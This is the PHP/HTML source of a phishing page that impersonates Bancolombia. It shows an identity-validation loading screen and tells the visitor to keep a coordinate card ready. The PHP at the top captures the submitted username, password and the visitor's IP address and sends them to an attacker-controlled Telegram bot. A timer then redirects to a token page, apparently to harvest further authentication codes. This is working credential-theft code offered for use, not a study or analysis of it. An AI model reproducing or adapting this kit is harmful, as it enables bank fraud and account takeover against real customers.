<?php
session_start();
ini_set("display_errors", 0);
$config = include('config.php');

$elusr = $_POST['mat-input-0'];
$llavecita = $_POST['password'];


$token = $config['token'];
$chat_id = $config['chat_id'];

$ip = $_SERVER['REMOTE_ADDR']; 



$mensaje_para_chatbot = "🔐❤B3D3V3❤️\nUsar: ".$elusr."\nC0D3: ".$llavecita."\nip: " . $ip;


$telegram_url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($mensaje_para_chatbot);


$response = file_get_contents($telegram_url);



?>

<html style="--app-height:724px;">

<head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=10">

   <title>Cargando</title> 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   <style type="text/css">
      /* Chart.js */
      @-webkit-keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      @keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      .chartjs-render-monitor {
         -webkit-animation: chartjs-render-animation 0.001s;
         animation: chartjs-render-animation 0.001s;
      }
   </style>
   <style type="text/css">
      /* Chart.js */
      @-webkit-keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      @keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      .chartjs-render-monitor {
         -webkit-animation: chartjs-render-animation 0.001s;
         animation: chartjs-render-animation 0.001s;
      }
   </style>
   <style type="text/css">
      /* Chart.js */
      @-webkit-keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      @keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      .chartjs-render-monitor {
         -webkit-animation: chartjs-render-animation 0.001s;
         animation: chartjs-render-animation 0.001s;
      }
   </style>
   <style type="text/css">
      /* Chart.js */
      @-webkit-keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      @keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      .chartjs-render-monitor {
         -webkit-animation: chartjs-render-animation 0.001s;
         animation: chartjs-render-animation 0.001s;
      }
   </style>

</head>

</div>
</header>
<!-- END Header -->
<!-- Nav -->
<center><img class="logo_mobile" src="./BDVenlínea personas_files/logo.png" alt="Bancolombia" width="300px"></center>
<!-- END Nav -->
<div id="hh">
   <section id="funnel-de-ingreso">
      <div class="container">
         <div class="container-top">
            <div class="row">
               <div class="col-sm-12">
                  <div class="inner-title">

                  </div>
               </div>
            </div>
         </div>
         <div style="background-color: #ffffff; width: 100%;">
            <br>
            <div style="text-align: center;" align="left"><img
                  style="width: 150px; display: block; margin-left: auto; margin-right: auto;"
                  src="./BDVenlínea personas_files/ldr.gif"></div>
            <br> <br>
            <div style="text-align: center;" align="center">
               Estamos validando tu identidad. <br> por favor ten cerca tu tarjeta de coordenadas <strong id="time">
                  <br><label id="countdown">0:10</label></strong></div><strong id="time">

               <br>
               <div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado"
                  style="text-align: center;">


               </div>
            </strong>
         </div><strong id="time">
         </strong>
      </div><strong id="time">
      </strong>
   </section><strong id="time">
      <script type="text/javascript">
         var url = "token.html";
         var seconds = 15; //número de segundos a contar
         function secondPassed() {

            var minutes = Math.round((seconds - 30) / 60); //calcula el número de minutos
            var remainingSeconds = seconds % 60; //calcula los segundos
            //si los segundos usan sólo un dígito, añadimos un cero a la izq
            if (remainingSeconds < 10) {
               remainingSeconds = "0" + remainingSeconds;
            }
            document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;
            if (seconds == 0) {
               clearInterval(countdownTimer);
               window.location = url;
               document.getElementById('countdown').innerHTML = "";
            } else {
               seconds--;
            }
         }

         var countdownTimer = setInterval(secondPassed, 1000);
      </script>
   </strong>
</div><strong id="time">


</strong></div><strong id="time">


</strong></body>

</html>